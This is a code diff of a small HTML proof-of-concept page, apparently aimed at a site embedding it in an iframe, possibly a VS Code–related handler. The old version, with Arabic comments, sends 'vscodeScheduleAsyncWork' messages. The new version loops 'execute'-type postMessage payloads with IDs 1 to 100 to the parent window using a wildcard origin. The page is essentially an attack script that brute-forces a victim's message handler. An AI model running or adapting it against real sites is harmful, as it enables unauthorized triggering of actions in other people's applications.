@@ -1,32 +1,38 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8" />
-    <title>Iframe postMessage Exploit</title>
-  </head>
-  <body>
-    <h1>Loading attack payload...</h1>
+<head>
+  <title>Iframe Exploit PoC</title>
+  <meta charset="UTF-8">
+  <style>
+    body { font-family: sans-serif; background: #111; color: #0f0; padding: 20px; }
+  </style>
+</head>
+<body>
+  <h1>📤 Sending payload to parent window...</h1>
+  <p>Check devtools console.</p>
 
-    <script>
-      // تحضير رسالة postMessage
-      const payload = {
-        // خصص المفتاح الذي يستقبله الموقع الضحية (حسب ما وجدته)
-        vscodeScheduleAsyncWork: 1, // نجرب ID=1 كبداية
-        // إذا كان هناك خصائص أخرى مطلوبة، أضفها هنا
-      };
+  <script>
+    let currentID = 1;
+    const MAX_ID = 100; // Adjust as needed
 
-      // إرسال الرسالة إلى النافذة الأم
-      console.log("Sending payload to parent...");
-      parent.postMessage(payload, "*"); // أو حدد origin بدلاً من "*"
+    const payload = (id) => ({
+      type: "execute",
+      id: id,
+      // You can add more keys depending on expected structure
+    });
 
-      // إعادة المحاولة مع IDات مختلفة
-      let id = 2;
-      const interval = setInterval(() => {
-        if (id > 20) clearInterval(interval);
-        parent.postMessage({ vscodeScheduleAsyncWork: id }, "*");
-        console.log("Trying ID: ", id);
-        id++;
-      }, 500);
-    </script>
-  </body>
+    const interval = setInterval(() => {
+      if (currentID > MAX_ID) {
+        clearInterval(interval);
+        console.log("✅ Done sending all payloads.");
+        return;
+      }
+
+      const msg = payload(currentID);
+      console.log("📤 Sending payload with ID:", currentID);
+      parent.postMessage(msg, "*"); // No need for a reply
+      currentID++;
+    }, 500); // 500ms delay to avoid flooding
+  </script>
+</body>
 </html>
